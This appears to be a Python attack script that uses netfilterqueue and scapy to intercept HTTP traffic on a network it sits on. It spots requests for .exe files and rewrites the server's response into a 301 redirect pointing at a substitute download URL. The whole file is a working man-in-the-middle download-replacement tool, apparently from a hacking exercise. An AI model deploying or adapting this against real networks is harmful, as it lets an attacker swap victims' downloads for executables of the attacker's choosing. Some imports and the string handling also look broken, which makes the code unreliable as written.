#!/usr/bin/env python3
# Rebuild
import netfilterqueue
from scapy.layers.inet import IP, TCP
from scapy.layers.dns import Raw

extensions = [".exe",".url",".zip",".pdf",".json",".md",".yml"]
ack_list = []

def process_packet(packet):
    scapy_packet= IP(packet.get_payload())
    if scapy_packet.haslayer(Raw):
        if scapy_packet.haslayer(TCP):
            print("\n[+] Packet has layer TCP")
            if scapy_packet[TCP].dport == 80:
                print("[+] This is a HTTP Request:  ")
                if ".exe" in scapy_packet[Raw].load:
                    print("[+] Found an Exe Request:  ")
                    print("[+] Here is our Acknowledgement Number: ")
                    print(scapy_packet[TCP].ack)
                    ack_list.append(scapy_packet[TCP].ack)

            elif scapy_packet[TCP].sport == 80:
                print("[+] This is a HTTP Response: ")
                if scapy_packet[TCP].seq:
                    # print(scapy_packet.show())
                    print("[+] Here is our Sequence Number: ")
                    print(scapy_packet[TCP].seq)
                    if scapy_packet[TCP].seq in ack_list:
                        # print(scapy_packet.show())
                        ack_list.remove(scapy_packet[TCP].seq)
                        print("[+] Replacing File: ")
                        # Tell the Target machine, the download link has moved permanently 301 to our download link
                        scapy_packet[Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-722.exe\n\n"
                        # Force scapy to recalculate these values for our updated load
                        del scapy_packet[IP].len
                        del scapy_packet[IP].chksum
                        del scapy_packet[TCP].chksum
                        # Modify the packet that will be sent to the target.
                        packet.set_payload(str(scapy_packet))
    packet.accept()


if __name__ == "__main__":
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()


